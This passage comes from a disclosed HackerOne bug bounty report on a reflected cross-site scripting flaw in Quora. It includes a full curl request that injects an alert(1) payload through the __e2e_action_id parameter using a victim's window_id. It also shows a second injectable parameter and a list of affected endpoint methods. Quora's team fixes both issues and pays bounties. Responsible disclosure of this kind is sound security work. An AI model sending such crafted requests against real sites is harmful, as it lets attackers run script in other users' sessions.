\u0026#39;json={\u0026quot;args\u0026quot;:[],\u0026quot;kwargs\u0026quot;:{\u0026quot;id\u0026quot;:███████████,\u0026quot;input\u0026quot;:{\u0026quot;sections\u0026quot;:[{\u0026quot;type\u0026quot;:\u0026quot;plain\u0026quot;,\u0026quot;indent\u0026quot;:0,\u0026quot;quoted\u0026quot;:false,\u0026quot;spans\u0026quot;:[{\u0026quot;modifiers\u0026quot;:{},\u0026quot;text\u0026quot;:\u0026quot;a\u0026quot;}]}],\u0026quot;caret\u0026quot;:{\u0026quot;start\u0026quot;:{\u0026quot;spanIdx\u0026quot;:0,\u0026quot;sectionIdx\u0026quot;:0,\u0026quot;offset\u0026quot;:1},\u0026quot;end\u0026quot;:{\u0026quot;spanIdx\u0026quot;:0,\u0026quot;sectionIdx\u0026quot;:0,\u0026quot;offset\u0026quot;:1}}}}}\u0026amp;revision=904d048187b642341464067b64246119b8ce9489\u0026amp;formkey=6a34c75ed7fda8439ca2407b4520c974\u0026amp;postkey=736f2eea9e3826808823625bf4ede215\u0026amp;window_id=dep3204-1727465467565139446\u0026amp;referring_controller=user\u0026amp;referring_action=profile\u0026amp;_lm_transaction_id=0.7159021828610441\u0026amp;_lm_window_id=dep3204-1727465467565139446\u0026amp;__vcon_json=[\u0026quot;2rtUq6Z4HO9gWK\u0026quot;]\u0026amp;__vcon_method=edit\u0026amp;__e2e_action_id=esl2xq4xyj\u0026amp;js_init={\u0026quot;id\u0026quot;:████████████,\u0026quot;input\u0026quot;:\u0026quot;user_description_text\u0026quot;,\u0026quot;typing_area\u0026quot;:null,\u0026quot;draft_space\u0026quot;:null,\u0026quot;unsaved_content_msg\u0026quot;:\u0026quot;Your content has not been saved.\u0026quot;,\u0026quot;focus_onload\u0026quot;:false,\u0026quot;is_qtext\u0026quot;:true,\u0026quot;require_comment\u0026quot;:false,\u0026quot;require_value\u0026quot;:false,\u0026quot;content_type\u0026quot;:null,\u0026quot;submit_text\u0026quot;:\u0026quot;Update\u0026quot;,\u0026quot;show_editor\u0026quot;:false}\u0026amp;__metadata={}\u0026#39; --compressed\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003ethe attacker obtain the victim channel name, eg: \u003ccode\u003edep3501-3261853912009855464\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003ethe attacker modify its previusly copied request, setting the \u003ccode\u003ewindow_id\u003c/code\u003e and \u003ccode\u003e_lm_window_id\u003c/code\u003e parameters to the victim channel name\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003ethe attacker modify the request, setting the \u003ccode\u003e__e2e_action_id\u003c/code\u003e parameter to inject its javascript payload, for example to \u003ccode\u003e\u0026#39;,alert(1),\u0026#39;\u003c/code\u003e, eg: \u003cbr\u003e\n\u003ccode\u003ecurl \u0026#39;https://www.quora.com/webnode2/server_call_POST?_v=2rtUq6Z4HO9gWK\u0026amp;_m=edit\u0026#39; -H \u0026#39;Cookie: m-b=\u0026quot;██████████████\u0026quot;; m-sa=1; m-s=\u0026quot;█████████████████\u0026quot;; m-screen_size=1920x1080; m-login=1; m-ju=███████████████████████████████████████; m-early_v=4e4c117b82baf40e; m-tz=-120; m-css_v=69026465bc2615b6; m-wf-loaded=q-icons-q_serif; _ga=GA1.2.2058437224.1502195915; _gid=GA1.2.1848940326.1502195915\u0026#39; -H \u0026#39;Origin: https://www.quora.com\u0026#39; -H \u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H \u0026#39;Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4\u0026#39; -H \u0026#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#39; -H \u0026#39;Accept: application/json, text/javascript, */*; q=0.01\u0026#39; -H \u0026#39;Referer: https://www.quora.com/profile/████\u0026#39; -H \u0026#39;X-Requested-With: XMLHttpRequest\u0026#39; -H \u0026#39;Connection: keep-alive\u0026#39; -H \u0026#39;DNT: 1\u0026#39; --data \u0026#39;json={\u0026quot;args\u0026quot;:[],\u0026quot;kwargs\u0026quot;:{\u0026quot;id\u0026quot;:█████████,\u0026quot;input\u0026quot;:{\u0026quot;sections\u0026quot;:[{\u0026quot;type\u0026quot;:\u0026quot;plain\u0026quot;,\u0026quot;indent\u0026quot;:0,\u0026quot;quoted\u0026quot;:false,\u0026quot;spans\u0026quot;:[{\u0026quot;modifiers\u0026quot;:{},\u0026quot;text\u0026quot;:\u0026quot;a\u0026quot;}]}],\u0026quot;caret\u0026quot;:{\u0026quot;start\u0026quot;:{\u0026quot;spanIdx\u0026quot;:0,\u0026quot;sectionIdx\u0026quot;:0,\u0026quot;offset\u0026quot;:1},\u0026quot;end\u0026quot;:{\u0026quot;spanIdx\u0026quot;:0,\u0026quot;sectionIdx\u0026quot;:0,\u0026quot;offset\u0026quot;:1}}}}}\u0026amp;revision=904d048187b642341464067b64246119b8ce9489\u0026amp;formkey=6a34c75ed7fda8439ca2407b4520c974\u0026amp;postkey=736f2eea9e3826808823625bf4ede215\u0026amp;window_id=dep3501-3261853912009855464\u0026amp;referring_controller=user\u0026amp;referring_action=profile\u0026amp;_lm_transaction_id=0.7159021828610441\u0026amp;_lm_window_id=dep3501-3261853912009855464\u0026amp;__vcon_json=[\u0026quot;2rtUq6Z4HO9gWK\u0026quot;]\u0026amp;__vcon_method=edit\u0026amp;__e2e_action_id=\\\u0026#39;,alert(1),\\\u0026#39;\u0026amp;js_init={\u0026quot;id\u0026quot;:████████,\u0026quot;input\u0026quot;:\u0026quot;user_description_text\u0026quot;,\u0026quot;typing_area\u0026quot;:null,\u0026quot;draft_space\u0026quot;:null,\u0026quot;unsaved_content_msg\u0026quot;:\u0026quot;Your content has not been saved.\u0026quot;,\u0026quot;focus_onload\u0026quot;:false,\u0026quot;is_qtext\u0026quot;:true,\u0026quot;require_comment\u0026quot;:false,\u0026quot;require_value\u0026quot;:false,\u0026quot;content_type\u0026quot;:null,\u0026quot;submit_text\u0026quot;:\u0026quot;Update\u0026quot;,\u0026quot;show_editor\u0026quot;:false}\u0026amp;__metadata={}\u0026#39; --compressed\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003ethe attacker send the request\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eon the victim page will be executed \u003ccode\u003ealert(1)\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eNotice that the cookie, postkey, formkey and other data are of the attacker session.\u003c/p\u003e\n\n\u003ch3 id=\"enviroment\"\u003eEnviroment\u003c/h3\u003e\n\n\u003cp\u003eTools used: \u003ccode\u003ecurl\u003c/code\u003e and \u003ccode\u003echromium\u003c/code\u003e\u003c/p\u003e\n\n\u003ch3 id=\"suggested-fix\"\u003eSuggested fix\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003ecorrectly escape \u003ccode\u003e__e2e_action_id\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003edo not allow to specify a channel name (\u003ccode\u003ewindow_id\u003c/code\u003e parameter) that is not \u0026quot;attached\u0026quot; to the session of the caller\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI can provide a demonstrating video if required or other info. \u003cbr\u003e\nThe severity was calculated with the Hackerone Calculator.\u003c/p\u003e\n","bounty_amount":"600.0","formatted_bounty":"$600","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":49,"voters":["jokebookservice1","sp1d3rs","michiel","mashoud1122","dawgyg","bogdantcaciuc","mygf","ankitsingh","asad0x01_","gamliel","and 39 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1934893,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi quora team, i've re-read the report and hoping everything is clear I wish to hear news from you soon. Many thanks","markdown_message":"\u003cp\u003eHi quora team, i\u0026#39;ve re-read the report and hoping everything is clear I wish to hear news from you soon. Many thanks\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-16T23:14:25.932Z","updated_at":"2017-08-16T23:14:25.932Z","actor":{"username":"0xnan","cleared":false,"url":"/0xnan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1939107,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a demonstrating video https://youtu.be/Y9e9cULNs6I","markdown_message":"\u003cp\u003eHere is a demonstrating video \u003ca title=\"https://youtu.be/Y9e9cULNs6I\" href=\"/redirect?url=https%3A%2F%2Fyoutu.be%2FY9e9cULNs6I\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://youtu.be/Y9e9cULNs6I\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-18T15:10:27.206Z","updated_at":"2017-08-18T15:10:27.206Z","actor":{"username":"0xnan","cleared":false,"url":"/0xnan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1940021,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-18T20:56:30.660Z","updated_at":"2017-08-18T20:56:30.660Z","additional_data":{"old_severity":"Medium (5.6)","new_severity":"Low","old_severity_id":67083,"new_severity_id":69240},"actor":{"username":"sriram-quora","cleared":false,"url":"/sriram-quora","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1940026,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the report. I am lowering the priority since the attack requires a certain amount of brute forcing with the window id and since the window id has large enough entropy this is not easy.","markdown_message":"\u003cp\u003eThanks for the report. I am lowering the priority since the attack requires a certain amount of brute forcing with the window id and since the window id has large enough entropy this is not easy.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-18T20:58:39.368Z","updated_at":"2017-08-18T20:58:39.368Z","actor":{"username":"sriram-quora","cleared":false,"url":"/sriram-quora","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1940033,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Adding a bonus for detailed report.","markdown_message":"\u003cp\u003eAdding a bonus for detailed report.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-18T21:05:09.505Z","updated_at":"2017-08-18T21:05:09.505Z","actor":{"url":"/quora","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/57b2b1ab624538b6b1a515c5b03f929ef41e0dfd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Quora"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"400.0","genius_execution_id":null,"team_handle":"quora","collaborator":{"username":"0xnan","url":"/0xnan"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1940037,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This should be fixed now. Can you verify?","markdown_message":"\u003cp\u003eThis should be fixed now. Can you verify?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-18T21:06:05.361Z","updated_at":"2017-08-18T21:06:05.361Z","actor":{"username":"sriram-quora","cleared":false,"url":"/sriram-quora","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1940058,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I will check and let you know in a few hours. Thank you very much  for the bounty and the bonus!","markdown_message":"\u003cp\u003eI will check and let you know in a few hours. Thank you very much  for the bounty and the bonus!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-18T21:13:59.876Z","updated_at":"2017-08-18T21:13:59.876Z","actor":{"username":"0xnan","cleared":false,"url":"/0xnan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1941085,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sriram-quora \nsorry for the delay but I wanted to take more time to deeply check the fix.\n\nI can confirm that the `__e2e_action_id` params is correctly escaped now, resulting in a 500 Internal Server Error if any of its char is outside [0-9a-z], \ni've checked with different char sets and seems ok. \nHowever I want to point out that there isn't any check obout the *length* of the field: it should be secure, but a simple limit can reduce the space of possibile misuses.\n\nI've noticed that is still possible to use a `window_id` of another user allowing an attacker to send messages (the responses of some methods) to other user.\nI've suggested to not allow such behaviour, but since I do not know the system's core I don know if it is a crucial aspect of the application (I suspect that there isn't any easy way to know if a `window_id` was associated to a specific user, maybe to maintains services stateless).\n\nAnyway since I think this is an intresting vector for an attacker, I've invested other time to understand which methods can send such messages and to help you if you think is the case to find be better way to secure this aspect.\nFortunately this work has highlighted another issue that can be quickly solved.\n\nI've recorded 30+ differents `server_call_POST` requests each of which with a different method. \nI've repeated each request setting a different `window_id` (of a different Quora user), and for each of those i've cheked if (and what) the `update` request (attached to the `window_id` used) returns.\nI've done some cross checks on the requests sent and the responses obtained, finding if there were other attacker-controlled data reflected back, and then checked if it were properly escaped.\n\nThis work highlighted **another parameter not escaped**: `_lm_transaction_id`.\nIt allows - in the same way of `__e2e_action_id` to inject javascript.\n\nFor example after a request `https://www.quora.com/webnode2/server_call_POST?_m=unfollow` with `_lm_transaction_id=0.8950069046032785` the `update` request returns with:\n\n```\njsonpc5010ec7bc014f198da3e75103cfd500({\"messages\":[\"require.whenReady(\\\"main\\\", function() {require('actions').finishAction('estsq43h0v', {\\\"controller\\\": \\\"webnode2\\\", \\\"action\\\": \\\"server_call_POST\\\", \\\"standard\\\": {\\\"server_side\\\": 200, \\\"e2e\\\": 500, \\\"owner\\\": 28, \\\"server_side_goal\\\": null}, \\\"serverTime\\\": 2339268, \\\"mustReport\\\": true});\\n             require(\\\"w2.livenode\\\").mutationDoneAfterVersion(0.8950069046032785,0);\\n        });\"],\"min_seq\":2980706171})\n```\nsimply setting `_lm_transaction_id=alert(1)` will trigger the XSS.\n\nThe value of `_lm_transaction_id` is initialized to `Math.random()` so a simple check to ensure that is a number should fix the escaping issue.\n\n\nTo help you to understand what kind of requests suffer of these escaping errors,\nthe following is a list of `server_call_POST` methods that reflect back the vulnerable `_lm_transaction_id` and the -now secure- `__e2e_action_id`:\n\n- add_topic\n- attach_decline_reason\n- clear_draft\n- dialog_submit_controller\n- edit\n- flag_object\n- follow\n- mark_as_cant_answer\n- mark_as_seen\n- press\n- request\n- revert_revision\n- submit\n- unfollow\n- unpress\n- update\n\nAnother method reflect only the vulnerable `_lm_transaction_id`:\n\n- update_access_token\n\nothers reflect only `__e2e_action_id`:\n\n- increase_count\n\nwhile others seems do not reflect any of these params, since no message is sent to `update` after these requests:\n\n- choose_photo\n- clear_badge\n- decline_modal\n- fetch_toggled_component\n- flag_modal\n- get_edit_wrapper\n- get_next_page\n- load_menu\n- load_modal\n- log_highlight_error\n- log_private_views\n- results_content_for\n- saved_results_content_for\n- set_dialog_contents\n- upload\n\n###summing up I suggest\n- to check the length of `__e2e_action_id`\n- to fix the escaping of this new parameter\n- to understand if this mechanism to send data can have others security implication or to not allow to use others `window_id`\n\nI'm wondering if this new parameter can be rewarded with a bounty? \nLet me know if you need more informations or when it is fixed, I will re-check.\n\nThank you, I learned new things ^^ (and sorry for my english) \n\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/sriram-quora\"\u003e@sriram-quora\u003c/a\u003e \u003cbr\u003e\nsorry for the delay but I wanted to take more time to deeply check the fix.\u003c/p\u003e\n\n\u003cp\u003eI can confirm that the \u003ccode\u003e__e2e_action_id\u003c/code\u003e params is correctly escaped now, resulting in a 500 Internal Server Error if any of its char is outside [0-9a-z], \u003cbr\u003e\ni\u0026#39;ve checked with different char sets and seems ok. \u003cbr\u003e\nHowever I want to point out that there isn\u0026#39;t any check obout the \u003cem\u003elength\u003c/em\u003e of the field: it should be secure, but a simple limit can reduce the space of possibile misuses.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve noticed that is still possible to use a \u003ccode\u003ewindow_id\u003c/code\u003e of another user allowing an attacker to send messages (the responses of some methods) to other user.\u003cbr\u003e\nI\u0026#39;ve suggested to not allow such behaviour, but since I do not know the system\u0026#39;s core I don know if it is a crucial aspect of the application (I suspect that there isn\u0026#39;t any easy way to know if a \u003ccode\u003ewindow_id\u003c/code\u003e was associated to a specific user, maybe to maintains services stateless).\u003c/p\u003e\n\n\u003cp\u003eAnyway since I think this is an intresting vector for an attacker, I\u0026#39;ve invested other time to understand which methods can send such messages and to help you if you think is the case to find be better way to secure this aspect.\u003cbr\u003e\nFortunately this work has highlighted another issue that can be quickly solved.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve recorded 30+ differents \u003ccode\u003eserver_call_POST\u003c/code\u003e requests each of which with a different method. \u003cbr\u003e\nI\u0026#39;ve repeated each request setting a different \u003ccode\u003ewindow_id\u003c/code\u003e (of a different Quora user), and for each of those i\u0026#39;ve cheked if (and what) the \u003ccode\u003eupdate\u003c/code\u003e request (attached to the \u003ccode\u003ewindow_id\u003c/code\u003e used) returns.\u003cbr\u003e\nI\u0026#39;ve done some cross checks on the requests sent and the responses obtained, finding if there were other attacker-controlled data reflected back, and then checked if it were properly escaped.\u003c/p\u003e\n\n\u003cp\u003eThis work highlighted \u003cstrong\u003eanother parameter not escaped\u003c/strong\u003e: \u003ccode\u003e_lm_transaction_id\u003c/code\u003e.\u003cbr\u003e\nIt allows - in the same way of \u003ccode\u003e__e2e_action_id\u003c/code\u003e to inject javascript.\u003c/p\u003e\n\n\u003cp\u003eFor example after a request \u003ccode\u003ehttps://www.quora.com/webnode2/server_call_POST?_m=unfollow\u003c/code\u003e with \u003ccode\u003e_lm_transaction_id=0.8950069046032785\u003c/code\u003e the \u003ccode\u003eupdate\u003c/code\u003e request returns with:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ejsonpc5010ec7bc014f198da3e75103cfd500({\u0026quot;messages\u0026quot;:[\u0026quot;require.whenReady(\\\u0026quot;main\\\u0026quot;, function() {require(\u0026#39;actions\u0026#39;).finishAction(\u0026#39;estsq43h0v\u0026#39;, {\\\u0026quot;controller\\\u0026quot;: \\\u0026quot;webnode2\\\u0026quot;, \\\u0026quot;action\\\u0026quot;: \\\u0026quot;server_call_POST\\\u0026quot;, \\\u0026quot;standard\\\u0026quot;: {\\\u0026quot;server_side\\\u0026quot;: 200, \\\u0026quot;e2e\\\u0026quot;: 500, \\\u0026quot;owner\\\u0026quot;: 28, \\\u0026quot;server_side_goal\\\u0026quot;: null}, \\\u0026quot;serverTime\\\u0026quot;: 2339268, \\\u0026quot;mustReport\\\u0026quot;: true});\\n             require(\\\u0026quot;w2.livenode\\\u0026quot;).mutationDoneAfterVersion(0.8950069046032785,0);\\n        });\u0026quot;],\u0026quot;min_seq\u0026quot;:2980706171})\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003esimply setting \u003ccode\u003e_lm_transaction_id=alert(1)\u003c/code\u003e will trigger the XSS.\u003c/p\u003e\n\n\u003cp\u003eThe value of \u003ccode\u003e_lm_transaction_id\u003c/code\u003e is initialized to \u003ccode\u003eMath.random()\u003c/code\u003e so a simple check to ensure that is a number should fix the escaping issue.\u003c/p\u003e\n\n\u003cp\u003eTo help you to understand what kind of requests suffer of these escaping errors,\u003cbr\u003e\nthe following is a list of \u003ccode\u003eserver_call_POST\u003c/code\u003e methods that reflect back the vulnerable \u003ccode\u003e_lm_transaction_id\u003c/code\u003e and the -now secure- \u003ccode\u003e__e2e_action_id\u003c/code\u003e:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eadd_topic\u003c/li\u003e\n\u003cli\u003eattach_decline_reason\u003c/li\u003e\n\u003cli\u003eclear_draft\u003c/li\u003e\n\u003cli\u003edialog_submit_controller\u003c/li\u003e\n\u003cli\u003eedit\u003c/li\u003e\n\u003cli\u003eflag_object\u003c/li\u003e\n\u003cli\u003efollow\u003c/li\u003e\n\u003cli\u003emark_as_cant_answer\u003c/li\u003e\n\u003cli\u003emark_as_seen\u003c/li\u003e\n\u003cli\u003epress\u003c/li\u003e\n\u003cli\u003erequest\u003c/li\u003e\n\u003cli\u003erevert_revision\u003c/li\u003e\n\u003cli\u003esubmit\u003c/li\u003e\n\u003cli\u003eunfollow\u003c/li\u003e\n\u003cli\u003eunpress\u003c/li\u003e\n\u003cli\u003eupdate\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAnother method reflect only the vulnerable \u003ccode\u003e_lm_transaction_id\u003c/code\u003e:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eupdate_access_token\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eothers reflect only \u003ccode\u003e__e2e_action_id\u003c/code\u003e:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eincrease_count\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003ewhile others seems do not reflect any of these params, since no message is sent to \u003ccode\u003eupdate\u003c/code\u003e after these requests:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003echoose_photo\u003c/li\u003e\n\u003cli\u003eclear_badge\u003c/li\u003e\n\u003cli\u003edecline_modal\u003c/li\u003e\n\u003cli\u003efetch_toggled_component\u003c/li\u003e\n\u003cli\u003eflag_modal\u003c/li\u003e\n\u003cli\u003eget_edit_wrapper\u003c/li\u003e\n\u003cli\u003eget_next_page\u003c/li\u003e\n\u003cli\u003eload_menu\u003c/li\u003e\n\u003cli\u003eload_modal\u003c/li\u003e\n\u003cli\u003elog_highlight_error\u003c/li\u003e\n\u003cli\u003elog_private_views\u003c/li\u003e\n\u003cli\u003eresults_content_for\u003c/li\u003e\n\u003cli\u003esaved_results_content_for\u003c/li\u003e\n\u003cli\u003eset_dialog_contents\u003c/li\u003e\n\u003cli\u003eupload\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"summing-up-i-suggest\"\u003esumming up I suggest\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eto check the length of \u003ccode\u003e__e2e_action_id\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eto fix the escaping of this new parameter\u003c/li\u003e\n\u003cli\u003eto understand if this mechanism to send data can have others security implication or to not allow to use others \u003ccode\u003ewindow_id\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI\u0026#39;m wondering if this new parameter can be rewarded with a bounty? \u003cbr\u003e\nLet me know if you need more informations or when it is fixed, I will re-check.\u003c/p\u003e\n\n\u003cp\u003eThank you, I learned new things ^^ (and sorry for my english) \u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-19T19:01:28.562Z","updated_at":"2017-08-19T19:01:28.562Z","actor":{"username":"0xnan","cleared":false,"url":"/0xnan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1950475,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sriram-quora, there is any update with this last issue? Best regards","markdown_message":"\u003cp\u003eHi \u003ca href=\"/sriram-quora\"\u003e@sriram-quora\u003c/a\u003e, there is any update with this last issue? Best regards\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-23T22:42:57.192Z","updated_at":"2017-08-23T22:42:57.192Z","actor":{"username":"0xnan","cleared":false,"url":"/0xnan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1950617,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah _lm_transaction_id is also an issue and we are fixing it.","markdown_message":"\u003cp\u003eYeah _lm_transaction_id is also an issue and we are fixing it.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-23T23:45:46.727Z","updated_at":"2017-08-23T23:45:46.727Z","actor":{"username":"sriram-quora","cleared":false,"url":"/sriram-quora","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1950618,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"adding a another small bonus for the new find.","markdown_message":"\u003cp\u003eadding a another small bonus for the new find.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-23T23:46:28.222Z","updated_at":"2017-08-23T23:46:28.222Z","actor":{"url":"/quora","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/57b2b1ab624538b6b1a515c5b03f929ef41e0dfd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Quora"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"quora","collaborator":{"username":"0xnan","url":"/0xnan"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1950675,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Really thank you! I will check ASAP, in the meantime if there is anything i can do to help you let me know. Best regards","markdown_message":"\u003cp\u003eReally thank you! I will check ASAP, in the meantime if there is anything i can do to help you let me know. Best regards\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-24T00:18:57.554Z","updated_at":"2017-08-24T00:18:57.554Z","actor":{"username":"0xnan","cleared":false,"url":"/0xnan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1954277,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can confirm that `_lm_transaction_id` is fixed now ","markdown_message":"\u003cp\u003eI can confirm that \u003ccode\u003e_lm_transaction_id\u003c/code\u003e is fixed now \u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-25T12:23:22.200Z","updated_at":"2017-08-25T12:23:22.200Z","actor":{"username":"0xnan","cleared":false,"url":"/0xnan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1955254,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks. We also added length limits.","markdown_message":"\u003cp\u003eThanks. We also added length limits.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-25T17:13:42.400Z","updated_at":"2017-08-25T17:13:42.400Z","actor":{"username":"sriram-quora","cleared":false,"url":"/sriram-quora","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"0xnan","url":"/0xnan"},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2474099,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-08T15:44:00.218Z","updated_at":"2018-03-08T15:44:00.218Z","first_to_agree":true,"actor":{"username":"0xnan","cleared":false,"url":"/0xnan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2474122,"is_internal":false,"editable":false,"type":"Activities::Comment","me